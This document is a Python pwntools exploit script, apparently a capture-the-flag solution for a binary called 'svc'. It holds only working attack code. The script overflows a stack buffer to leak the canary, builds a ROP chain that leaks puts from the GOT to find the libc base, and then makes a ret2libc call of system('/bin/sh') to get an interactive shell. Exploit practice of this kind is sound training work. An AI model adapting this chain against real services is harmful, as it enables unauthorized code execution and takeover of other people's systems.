from pwn import *

context.binary = './svc'
context.arch = 'amd64'
context.log_level = 'info'

elf = ELF('./svc')

p = process('./svc')
# gdb.attach(p)  # uncomment if debugging

# ------------------------
# Fixed binary addresses
# ------------------------
POP_RDI   = 0x400ea3
PUTS_PLT  = elf.plt['puts']
PUTS_GOT  = elf.got['puts']
MENU      = 0x400a96

# ------------------------
# libc-2.23 offsets
# ------------------------
PUTS_OFF   = 0x6f690
SYSTEM_OFF = 0x45390
BINSH_OFF  = 0x18cd57

# ------------------------
# Helpers
# ------------------------
def feed(data):
    p.recvuntil(b'>>')
    p.sendline(b'1')
    p.recvuntil(b'>>')
    p.send(data)

def review():
    p.recvuntil(b'>>')
    p.sendline(b'2')

def exit_menu():
    p.recvuntil(b'>>')
    p.sendline(b'3')

# ========================
# 1) LEAK STACK CANARY
# ========================
payload  = b'A' * 0xa8
payload += b'A'             # overwrite canary LSB

feed(payload)
review()

p.recvuntil(b'A' * 0xa9)
canary = u64(b'\x00' + p.recv(7))
log.success(f"Canary leaked: {hex(canary)}")

# ========================
# 2) LEAK LIBC (puts)
# ========================
payload  = b'A' * 0xa8
payload += p64(canary)
payload += b'B' * 8
payload += p64(POP_RDI)
payload += p64(PUTS_GOT)
payload += p64(PUTS_PLT)
payload += p64(MENU)

feed(payload)
exit_menu()

p.recvuntil(b'BYE ~ TIME TO MINE MIENRALS...\n')
puts_leak = u64(p.recvline().strip().ljust(8, b'\x00'))

libc_base = puts_leak - PUTS_OFF
system    = libc_base + SYSTEM_OFF
binsh     = libc_base + BINSH_OFF

log.success(f"libc base : {hex(libc_base)}")
log.success(f"system    : {hex(system)}")
log.success(f"/bin/sh   : {hex(binsh)}")

# ========================
# 3) RET2LIBC → SHELL
# ========================
payload  = b'A' * 0xa8
payload += p64(canary)
payload += b'B' * 8
payload += p64(POP_RDI)
payload += p64(binsh)
payload += p64(system)

feed(payload)
exit_menu()

p.interactive()

